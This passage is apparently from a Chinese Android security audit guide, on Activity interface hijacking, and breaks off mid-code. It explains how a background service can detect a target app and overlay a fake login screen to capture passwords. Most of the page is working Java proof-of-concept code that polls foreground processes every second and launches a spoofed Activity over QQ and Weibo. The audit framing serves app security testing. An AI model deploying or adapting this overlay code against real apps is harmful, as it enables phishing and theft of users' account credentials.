<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>2.8.5 Activity——activity界面劫持</title>
</head>
<body>
<div id="wmd-preview" class="wmd-preview"><div class="md-section-divider"></div><div class="md-section-divider"></div><h1 data-anchor-id="5mfj" id="285-activityactivity界面劫持">2.8.5 Activity——activity界面劫持</h1><div class="md-section-divider"></div><h2 data-anchor-id="l9ds" id="问题描述">问题描述</h2><blockquote data-anchor-id="kirk" class="white-blockquote">
  <p>App正常的Activity界面被恶意攻击者替换上仿冒的恶意Activity界面进行攻击和非法用途。界面劫持很难被识别出来，其造成的后果会带来严重损失。例如，当用户打开手机应用的登陆页面。这时，如果侦测到用户的这一动作，立刻弹出一个与该页面相同的Activity，覆盖掉了合法的activity，用户无法查询。 </p>
  
  <p>如果启动一个activity时，加入一个标志位FLAG_ACTIVITY_NEW_TASK,就可以使它至于栈顶呈现给用户。在Android系统当中，程序可以枚举当前运行的进程而不需要声明其他权限，这样子我们就可以写一个程序，启动一个后台的服务，这个服务不断地扫描当前运行的进程，当发现目标进程启动时，就启动一个伪装的Activity。如果这个Activity是登录界面，那么就可以从中获取用户的账号密码。 </p>
</blockquote><div class="md-section-divider"></div><h2 data-anchor-id="d0qu" id="风险等级">风险等级</h2><blockquote data-anchor-id="sc0h" class="white-blockquote">
  <p>低危</p>
</blockquote><div class="md-section-divider"></div><h2 data-anchor-id="nz28" id="检测方法">检测方法</h2><p data-anchor-id="ewea"><strong>Mainactivity</strong></p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="k91i"><ol class="linenums"><li class="L0"><code><span class="kwd">public</span><span class="pln"> </span><span class="kwd">class</span><span class="pln">  </span><span class="typ">MainActivity</span><span class="pln"> </span><span class="kwd">extends</span><span class="pln"> </span><span class="typ">AppCompatActivity</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L1"><code><span class="pln">    </span><span class="lit">@Override</span></code></li><li class="L2"><code><span class="pln">    </span><span class="kwd">protected</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> onCreate</span><span class="pun">(</span><span class="typ">Bundle</span><span class="pln"> savedInstanceState</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L3"><code><span class="pln">        </span><span class="kwd">super</span><span class="pun">.</span><span class="pln">onCreate</span><span class="pun">(</span><span class="pln">savedInstanceState</span><span class="pun">);</span></code></li><li class="L4"><code><span class="pln">        setContentView</span><span class="pun">(</span><span class="pln">R</span><span class="pun">.</span><span class="pln">layout</span><span class="pun">.</span><span class="pln">activity_main</span><span class="pun">);</span></code></li><li class="L5"><code><span class="pln">        </span><span class="kwd">final</span><span class="pln"> </span><span class="typ">Intent</span><span class="pln"> intent </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">Intent</span><span class="pun">(</span><span class="typ">MainActivity</span><span class="pun">.</span><span class="kwd">this</span><span class="pun">,</span><span class="typ">HijackingService</span><span class="pun">.</span><span class="kwd">class</span><span class="pun">);</span></code></li><li class="L6"><code><span class="pln">        findViewById</span><span class="pun">(</span><span class="pln">R</span><span class="pun">.</span><span class="pln">id</span><span class="pun">.</span><span class="pln">start</span><span class="pun">).</span><span class="pln">setOnClickListener</span><span class="pun">(</span><span class="kwd">new</span><span class="pln"> </span><span class="typ">View</span><span class="pun">.</span><span class="typ">OnClickListener</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L7"><code><span class="pln">            </span><span class="lit">@Override</span></code></li><li class="L8"><code><span class="pln">            </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> onClick</span><span class="pun">(</span><span class="typ">View</span><span class="pln"> view</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L9"><code><span class="pln">                startService</span><span class="pun">(</span><span class="pln">intent</span><span class="pun">);</span></code></li><li class="L0"><code><span class="pln">            </span><span class="pun">}</span></code></li><li class="L1"><code><span class="pln">        </span><span class="pun">});</span></code></li><li class="L2"><code><span class="pln">        findViewById</span><span class="pun">(</span><span class="pln">R</span><span class="pun">.</span><span class="pln">id</span><span class="pun">.</span><span class="pln">stop</span><span class="pun">).</span><span class="pln">setOnClickListener</span><span class="pun">(</span><span class="kwd">new</span><span class="pln"> </span><span class="typ">View</span><span class="pun">.</span><span class="typ">OnClickListener</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L3"><code><span class="pln">            </span><span class="lit">@Override</span></code></li><li class="L4"><code><span class="pln">            </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> onClick</span><span class="pun">(</span><span class="typ">View</span><span class="pln"> view</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L5"><code><span class="pln">                stopService</span><span class="pun">(</span><span class="pln">intent</span><span class="pun">);</span></code></li><li class="L6"><code><span class="pln">            </span><span class="pun">}</span></code></li><li class="L7"><code><span class="pln">        </span><span class="pun">});</span></code></li><li class="L8"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L9"><code><span class="pun">}</span></code></li></ol></pre><p data-anchor-id="nu1c"><strong>HijackingService</strong></p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="efdo"><ol class="linenums"><li class="L0"><code><span class="kwd">package</span><span class="pln"> com</span><span class="pun">.</span><span class="pln">hijack</span><span class="pun">.</span><span class="pln">demo</span><span class="pun">.</span><span class="pln">hijack</span><span class="pun">;</span></code></li><li class="L1"><code></code></li><li class="L2"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">app</span><span class="pun">.</span><span class="typ">Service</span><span class="pun">;</span></code></li><li class="L3"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">content</span><span class="pun">.</span><span class="typ">Context</span><span class="pun">;</span></code></li><li class="L4"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">content</span><span class="pun">.</span><span class="typ">Intent</span><span class="pun">;</span></code></li><li class="L5"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">content</span><span class="pun">.</span><span class="pln">pm</span><span class="pun">.</span><span class="typ">PackageInfo</span><span class="pun">;</span></code></li><li class="L6"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">content</span><span class="pun">.</span><span class="pln">pm</span><span class="pun">.</span><span class="typ">PackageManager</span><span class="pun">;</span></code></li><li class="L7"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">os</span><span class="pun">.</span><span class="typ">Handler</span><span class="pun">;</span></code></li><li class="L8"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">os</span><span class="pun">.</span><span class="typ">IBinder</span><span class="pun">;</span></code></li><li class="L9"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">support</span><span class="pun">.</span><span class="pln">annotation</span><span class="pun">.</span><span class="typ">Nullable</span><span class="pun">;</span></code></li><li class="L0"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">util</span><span class="pun">.</span><span class="typ">Log</span><span class="pun">;</span></code></li><li class="L1"><code></code></li><li class="L2"><code><span class="kwd">import</span><span class="pln"> com</span><span class="pun">.</span><span class="pln">jaredrummler</span><span class="pun">.</span><span class="pln">android</span><span class="pun">.</span><span class="pln">processes</span><span class="pun">.</span><span class="typ">AndroidProcesses</span><span class="pun">;</span></code></li><li class="L3"><code><span class="kwd">import</span><span class="pln"> com</span><span class="pun">.</span><span class="pln">jaredrummler</span><span class="pun">.</span><span class="pln">android</span><span class="pun">.</span><span class="pln">processes</span><span class="pun">.</span><span class="pln">models</span><span class="pun">.</span><span class="typ">AndroidAppProcess</span><span class="pun">;</span></code></li><li class="L4"><code></code></li><li class="L5"><code><span class="kwd">import</span><span class="pln"> java</span><span class="pun">.</span><span class="pln">util</span><span class="pun">.</span><span class="typ">ArrayList</span><span class="pun">;</span></code></li><li class="L6"><code><span class="kwd">import</span><span class="pln"> java</span><span class="pun">.</span><span class="pln">util</span><span class="pun">.</span><span class="typ">HashMap</span><span class="pun">;</span></code></li><li class="L7"><code><span class="kwd">import</span><span class="pln"> java</span><span class="pun">.</span><span class="pln">util</span><span class="pun">.</span><span class="typ">List</span><span class="pun">;</span></code></li><li class="L8"><code></code></li><li class="L9"><code><span class="com">/**</span></code></li><li class="L0"><code><span class="com"> * Created by abigbread on 2018/9/4 0030.</span></code></li><li class="L1"><code><span class="com"> *</span></code></li><li class="L2"><code><span class="com"> * 劫持服务</span></code></li><li class="L3"><code><span class="com"> */</span></code></li><li class="L4"><code></code></li><li class="L5"><code><span class="kwd">public</span><span class="pln"> </span><span class="kwd">class</span><span class="pln"> </span><span class="typ">HijackingService</span><span class="pln"> </span><span class="kwd">extends</span><span class="pln"> </span><span class="typ">Service</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L6"><code><span class="pln">    </span><span class="lit">@Nullable</span></code></li><li class="L7"><code><span class="pln">    </span><span class="lit">@Override</span></code></li><li class="L8"><code><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">IBinder</span><span class="pln"> onBind</span><span class="pun">(</span><span class="typ">Intent</span><span class="pln"> intent</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L9"><code><span class="pln">        </span><span class="kwd">return</span><span class="pln"> </span><span class="kwd">null</span><span class="pun">;</span></code></li><li class="L0"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L1"><code></code></li><li class="L2"><code><span class="pln">    </span><span class="kwd">private</span><span class="pln"> </span><span class="kwd">boolean</span><span class="pln"> hasStart </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">false</span><span class="pun">;</span></code></li><li class="L3"><code><span class="pln">    </span><span class="com">//劫持列表</span></code></li><li class="L4"><code><span class="pln">    </span><span class="typ">HashMap</span><span class="pun">&lt;</span><span class="typ">String</span><span class="pun">,</span><span class="pln"> </span><span class="typ">Class</span><span class="pun">&lt;?&gt;&gt;</span><span class="pln"> classStores </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">HashMap</span><span class="pun">&lt;&gt;();</span></code></li><li class="L5"><code><span class="pln">    </span><span class="typ">Handler</span><span class="pln"> handler </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">Handler</span><span class="pun">();</span></code></li><li class="L6"><code><span class="pln">    </span><span class="typ">Runnable</span><span class="pln"> mTask </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">Runnable</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L7"><code><span class="pln">        </span><span class="lit">@Override</span></code></li><li class="L8"><code><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> run</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L9"><code><span class="pln">            hijackPackage</span><span class="pun">(</span><span class="pln">getApplication</span><span class="pun">());</span></code></li><li class="L0"><code><span class="pln">            handler</span><span class="pun">.</span><span class="pln">postDelayed</span><span class="pun">(</span><span class="pln">mTask</span><span class="pun">,</span><span class="pln"> </span><span class="lit">1000</span><span class="pun">);</span></code></li><li class="L1"><code><span class="pln">        </span><span class="pun">}</span></code></li><li class="L2"><code><span class="pln">    </span><span class="pun">};</span></code></li><li class="L3"><code></code></li><li class="L4"><code><span class="pln">    </span><span class="lit">@Override</span></code></li><li class="L5"><code><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> onCreate</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L6"><code><span class="pln">        </span><span class="kwd">super</span><span class="pun">.</span><span class="pln">onCreate</span><span class="pun">();</span></code></li><li class="L7"><code><span class="pln">        </span><span class="com">//获取所有已安装应用 package 信息,已打印</span></code></li><li class="L8"><code><span class="pln">        getItems</span><span class="pun">(</span><span class="pln">getApplication</span><span class="pun">());</span></code></li><li class="L9"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L0"><code></code></li><li class="L1"><code><span class="pln">    </span><span class="lit">@Override</span></code></li><li class="L2"><code><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> onStart</span><span class="pun">(</span><span class="typ">Intent</span><span class="pln"> intent</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> startId</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L3"><code><span class="pln">        </span><span class="kwd">super</span><span class="pun">.</span><span class="pln">onStart</span><span class="pun">(</span><span class="pln">intent</span><span class="pun">,</span><span class="pln"> startId</span><span class="pun">);</span></code></li><li class="L4"><code><span class="pln">        </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"劫持服务开启"</span><span class="pun">);</span></code></li><li class="L5"><code><span class="pln">        </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(!</span><span class="pln">hasStart</span><span class="pun">){</span></code></li><li class="L6"><code><span class="pln">            </span><span class="com">//添加想要劫持的应用</span></code></li><li class="L7"><code><span class="pln">            classStores</span><span class="pun">.</span><span class="pln">put</span><span class="pun">(</span><span class="str">"com.tencent.mobileqq"</span><span class="pun">,</span><span class="pln"> </span><span class="typ">QQActivity</span><span class="pun">.</span><span class="kwd">class</span><span class="pun">);</span></code></li><li class="L8"><code><span class="pln">            classStores</span><span class="pun">.</span><span class="pln">put</span><span class="pun">(</span><span class="str">"com.zzw.content"</span><span class="pun">,</span><span class="pln"> </span><span class="typ">QQActivity</span><span class="pun">.</span><span class="kwd">class</span><span class="pun">);</span></code></li><li class="L9"><code><span class="pln">            classStores</span><span class="pun">.</span><span class="pln">put</span><span class="pun">(</span><span class="str">"com.sina.weibo"</span><span class="pun">,</span><span class="typ">QQActivity</span><span class="pun">.</span><span class="kwd">class</span><span class="pun">);</span></code></li><li class="L0"><code></code></li><li class="L1"><code><span class="pln">            handler</span><span class="pun">.</span><span class="pln">postDelayed</span><span class="pun">(</span><span class="pln">mTask</span><span class="pun">,</span><span class="pln"> </span><span class="lit">1000</span><span class="pun">);</span></code></li><li class="L2"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"定时劫持任务开始执行"</span><span class="pun">);</span></code></li><li class="L3"><code><span class="pln">            hasStart </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">;</span></code></li><li class="L4"><code><span class="pln">        </span><span class="pun">}</span></code></li><li class="L5"><code></code></li><li class="L6"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L7"><code></code></li><li class="L8"><code><span class="pln">    </span><span class="lit">@Override</span></code></li><li class="L9"><code><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> onDestroy</span><span class="pun">()</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L0"><code><span class="pln">        </span><span class="kwd">super</span><span class="pun">.</span><span class="pln">onDestroy</span><span class="pun">();</span></code></li><li class="L1"><code><span class="pln">        </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"劫持服务停止"</span><span class="pun">);</span></code></li><li class="L2"><code><span class="pln">        hasStart </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">false</span><span class="pun">;</span></code></li><li class="L3"><code><span class="pln">        </span><span class="typ">HijackingApplication</span><span class="pun">.</span><span class="pln">clearProgressHijacked</span><span class="pun">();</span></code></li><li class="L4"><code><span class="pln">        handler</span><span class="pun">.</span><span class="pln">removeCallbacks</span><span class="pun">(</span><span class="pln">mTask</span><span class="pun">);</span></code></li><li class="L5"><code><span class="pln">        </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"定时劫持任务停止"</span><span class="pun">);</span></code></li><li class="L6"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L7"><code></code></li><li class="L8"><code><span class="pln">    </span><span class="com">//获取已安装的应用信息</span></code></li><li class="L9"><code><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">ArrayList</span><span class="pun">&lt;</span><span class="typ">HashMap</span><span class="pun">&lt;</span><span class="typ">String</span><span class="pun">,</span><span class="pln"> </span><span class="typ">Object</span><span class="pun">&gt;&gt;</span><span class="pln"> getItems</span><span class="pun">(</span><span class="typ">Context</span><span class="pln"> context</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L0"><code><span class="pln">        </span><span class="typ">PackageManager</span><span class="pln"> pckMan </span><span class="pun">=</span><span class="pln"> context</span><span class="pun">.</span><span class="pln">getPackageManager</span><span class="pun">();</span></code></li><li class="L1"><code><span class="pln">        </span><span class="typ">ArrayList</span><span class="pun">&lt;</span><span class="typ">HashMap</span><span class="pun">&lt;</span><span class="typ">String</span><span class="pun">,</span><span class="pln"> </span><span class="typ">Object</span><span class="pun">&gt;&gt;</span><span class="pln"> items </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">ArrayList</span><span class="pun">&lt;</span><span class="typ">HashMap</span><span class="pun">&lt;</span><span class="typ">String</span><span class="pun">,</span><span class="pln"> </span><span class="typ">Object</span><span class="pun">&gt;&gt;();</span></code></li><li class="L2"><code><span class="pln">        </span><span class="typ">List</span><span class="pun">&lt;</span><span class="typ">PackageInfo</span><span class="pun">&gt;</span><span class="pln"> packageInfo </span><span class="pun">=</span><span class="pln"> pckMan</span><span class="pun">.</span><span class="pln">getInstalledPackages</span><span class="pun">(</span><span class="lit">0</span><span class="pun">);</span></code></li><li class="L3"><code><span class="pln">        </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"------------打印已安装应用信息-----------------"</span><span class="pun">);</span></code></li><li class="L4"><code><span class="pln">        </span><span class="kwd">for</span><span class="pln"> </span><span class="pun">(</span><span class="typ">PackageInfo</span><span class="pln"> pInfo </span><span class="pun">:</span><span class="pln"> packageInfo</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L5"><code><span class="pln">            </span><span class="typ">HashMap</span><span class="pun">&lt;</span><span class="typ">String</span><span class="pun">,</span><span class="pln"> </span><span class="typ">Object</span><span class="pun">&gt;</span><span class="pln"> item </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">HashMap</span><span class="pun">&lt;</span><span class="typ">String</span><span class="pun">,</span><span class="pln"> </span><span class="typ">Object</span><span class="pun">&gt;();</span></code></li><li class="L6"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"-----------------------------"</span><span class="pun">);</span></code></li><li class="L7"><code><span class="pln">            item</span><span class="pun">.</span><span class="pln">put</span><span class="pun">(</span><span class="str">"appimage"</span><span class="pun">,</span><span class="pln"> pInfo</span><span class="pun">.</span><span class="pln">applicationInfo</span><span class="pun">.</span><span class="pln">loadIcon</span><span class="pun">(</span><span class="pln">pckMan</span><span class="pun">));</span></code></li><li class="L8"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"appimage--&gt;"</span><span class="pun">+</span><span class="pln">pInfo</span><span class="pun">.</span><span class="pln">applicationInfo</span><span class="pun">.</span><span class="pln">loadIcon</span><span class="pun">(</span><span class="pln">pckMan</span><span class="pun">));</span></code></li><li class="L9"><code></code></li><li class="L0"><code><span class="pln">            item</span><span class="pun">.</span><span class="pln">put</span><span class="pun">(</span><span class="str">"packageName"</span><span class="pun">,</span><span class="pln"> pInfo</span><span class="pun">.</span><span class="pln">packageName</span><span class="pun">);</span></code></li><li class="L1"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"packageName--&gt;"</span><span class="pun">+</span><span class="pln">pInfo</span><span class="pun">.</span><span class="pln">packageName</span><span class="pun">);</span></code></li><li class="L2"><code></code></li><li class="L3"><code><span class="pln">            item</span><span class="pun">.</span><span class="pln">put</span><span class="pun">(</span><span class="str">"versionCode"</span><span class="pun">,</span><span class="pln"> pInfo</span><span class="pun">.</span><span class="pln">versionCode</span><span class="pun">);</span></code></li><li class="L4"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"versionCode--&gt;"</span><span class="pun">+</span><span class="pln">pInfo</span><span class="pun">.</span><span class="pln">versionCode</span><span class="pun">);</span></code></li><li class="L5"><code></code></li><li class="L6"><code><span class="pln">            item</span><span class="pun">.</span><span class="pln">put</span><span class="pun">(</span><span class="str">"versionName"</span><span class="pun">,</span><span class="pln"> pInfo</span><span class="pun">.</span><span class="pln">versionName</span><span class="pun">);</span></code></li><li class="L7"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"versionName--&gt;"</span><span class="pun">+</span><span class="pln">pInfo</span><span class="pun">.</span><span class="pln">versionName</span><span class="pun">);</span></code></li><li class="L8"><code></code></li><li class="L9"><code><span class="pln">            item</span><span class="pun">.</span><span class="pln">put</span><span class="pun">(</span><span class="str">"appName"</span><span class="pun">,</span><span class="pln"> pInfo</span><span class="pun">.</span><span class="pln">applicationInfo</span><span class="pun">.</span><span class="pln">loadLabel</span><span class="pun">(</span><span class="pln">pckMan</span><span class="pun">).</span><span class="pln">toString</span><span class="pun">());</span></code></li><li class="L0"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"appName--&gt;"</span><span class="pun">+</span><span class="pln">pInfo</span><span class="pun">.</span><span class="pln">applicationInfo</span><span class="pun">.</span><span class="pln">loadLabel</span><span class="pun">(</span><span class="pln">pckMan</span><span class="pun">).</span><span class="pln">toString</span><span class="pun">());</span></code></li><li class="L1"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"-----------------------------"</span><span class="pun">);</span></code></li><li class="L2"><code><span class="pln">            items</span><span class="pun">.</span><span class="pln">add</span><span class="pun">(</span><span class="pln">item</span><span class="pun">);</span></code></li><li class="L3"><code><span class="pln">        </span><span class="pun">}</span></code></li><li class="L4"><code><span class="pln">        </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"-------------打印已安装应用信息完毕----------------"</span><span class="pun">);</span></code></li><li class="L5"><code></code></li><li class="L6"><code><span class="pln">        </span><span class="kwd">return</span><span class="pln"> items</span><span class="pun">;</span></code></li><li class="L7"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L8"><code></code></li><li class="L9"><code><span class="pln">    </span><span class="kwd">private</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> hijackPackage</span><span class="pun">(</span><span class="typ">Context</span><span class="pln"> context</span><span class="pun">){</span></code></li><li class="L0"><code><span class="pln">        </span><span class="com">//获取一个在前台运行应用的 List</span></code></li><li class="L1"><code><span class="pln">        </span><span class="typ">List</span><span class="pun">&lt;</span><span class="typ">AndroidAppProcess</span><span class="pun">&gt;</span><span class="pln"> runningForegroundApps </span><span class="pun">=</span><span class="pln"> </span><span class="typ">AndroidProcesses</span><span class="pun">.</span><span class="pln">getRunningForegroundApps</span><span class="pun">(</span><span class="pln">context</span><span class="pun">);</span></code></li><li class="L2"><code><span class="pln">        </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">runningForegroundApps</span><span class="pun">.</span><span class="pln">size</span><span class="pun">()</span><span class="pln"> </span><span class="pun">&gt;</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span></code></li><li class="L3"><code></code></li><li class="L4"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"正在劫持"</span><span class="pun">);</span></code></li><li class="L5"><code></code></li><li class="L6"><code><span class="pln">            </span><span class="kwd">for</span><span class="pln"> </span><span class="pun">(</span><span class="typ">AndroidAppProcess</span><span class="pln"> androidAppProcess </span><span class="pun">:</span><span class="pln"> runningForegroundApps</span><span class="pun">){</span></code></li><li class="L7"><code><span class="pln">                </span><span class="typ">String</span><span class="pln"> packageStr </span><span class="pun">=</span><span class="pln"> androidAppProcess</span><span class="pun">.</span><span class="pln">getPackageName</span><span class="pun">();</span></code></li><li class="L8"><code><span class="pln">                </span><span class="com">//如果已经劫持过当前应用，则不继续劫持</span></code></li><li class="L9"><code><span class="pln">                </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(!</span><span class="typ">HijackingApplication</span><span class="pun">.</span><span class="pln">hasProgressBeHijacked</span><span class="pun">(</span><span class="pln">packageStr</span><span class="pun">)){</span></code></li><li class="L0"><code><span class="pln">                    </span><span class="com">//前台运行的应用是否在劫持列表中</span></code></li><li class="L1"><code><span class="pln">                    </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">classStores</span><span class="pun">.</span><span class="pln">containsKey</span><span class="pun">(</span><span class="pln">packageStr</span><span class="pun">)){</span></code></li><li class="L2"><code><span class="pln">                        </span><span class="com">//已经劫持过应用添加到 HijackingApplication</span></code></li><li class="L3"><code><span class="pln">                        </span><span class="typ">HijackingApplication</span><span class="pun">.</span><span class="pln">addProgressHijacked</span><span class="pun">(</span><span class="pln">packageStr</span><span class="pun">);</span></code></li><li class="L4"><code><span class="pln">                        </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"已经劫持--&gt;"</span><span class="pun">+</span><span class="pln">packageStr</span><span class="pun">);</span></code></li><li class="L5"><code></code></li><li class="L6"><code><span class="pln">                        </span><span class="typ">Intent</span><span class="pln"> jackingIsComing </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">Intent</span><span class="pun">(</span><span class="pln">getBaseContext</span><span class="pun">(),</span><span class="pln"> classStores</span><span class="pun">.</span><span class="kwd">get</span><span class="pun">(</span><span class="pln">packageStr</span><span class="pun">));</span></code></li><li class="L7"><code><span class="pln">                        jackingIsComing</span><span class="pun">.</span><span class="pln">addFlags</span><span class="pun">(</span><span class="typ">Intent</span><span class="pun">.</span><span class="pln">FLAG_ACTIVITY_NEW_TASK</span><span class="pun">);</span></code></li><li class="L8"><code><span class="pln">                        getApplication</span><span class="pun">().</span><span class="pln">startActivity</span><span class="pun">(</span><span class="pln">jackingIsComing</span><span class="pun">);</span></code></li><li class="L9"><code><span class="pln">                        </span><span class="kwd">break</span><span class="pun">;</span></code></li><li class="L0"><code><span class="pln">                    </span><span class="pun">}</span></code></li><li class="L1"><code><span class="pln">                </span><span class="pun">}</span></code></li><li class="L2"><code><span class="pln">            </span><span class="pun">}</span></code></li><li class="L3"><code></code></li><li class="L4"><code><span class="pln">            </span><span class="typ">Log</span><span class="pun">.</span><span class="pln">w</span><span class="pun">(</span><span class="str">"hijacking"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"一次劫持结束"</span><span class="pun">);</span></code></li><li class="L5"><code></code></li><li class="L6"><code><span class="pln">        </span><span class="pun">}</span></code></li><li class="L7"><code><span class="pln">    </span><span class="pun">}</span></code></li><li class="L8"><code><span class="pun">}</span></code></li></ol></pre><p data-anchor-id="1zjo"><strong>HijackingApplication</strong></p><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="45f5"><ol class="linenums"><li class="L0"><code><span class="kwd">package</span><span class="pln"> com</span><span class="pun">.</span><span class="pln">hijack</span><span class="pun">.</span><span class="pln">demo</span><span class="pun">.</span><span class="pln">hijack</span><span class="pun">;</span></code></li><li class="L1"><code></code></li><li class="L2"><code><span class="kwd">import</span><span class="pln"> android</span><span class="pun">.</span><span class="pln">util</span><span class="pun">.</span><span class="typ">Log</span><span class="pun">;</span></code></li><li class="L3"><code></code></li><li class="L4"><code><span class="kwd">import</span><span class="pln"> java</span><span class="pun">.</span><span class="pln">util</span><span class="pun">.</span><span class="typ">ArrayList</span><span class="pun">;</span></code></li><li class="L5"><code><span class="kwd">import</span><span class="pln"> java</span><span class="pun">.</span><span class="pln">util</span><span class="pun">.</span><span class="typ">List</span><span class="pun">;</span></code></li><li class="L6"><code></code></li><li class="L7"><code><span class="kwd">public</span><span class="pln"> </span><span class="kwd">class</span><span class="pln"> </span><span class="typ">HijackingApplication</span><span class="pln"> </span><span class="pun">{</span></code></li><li 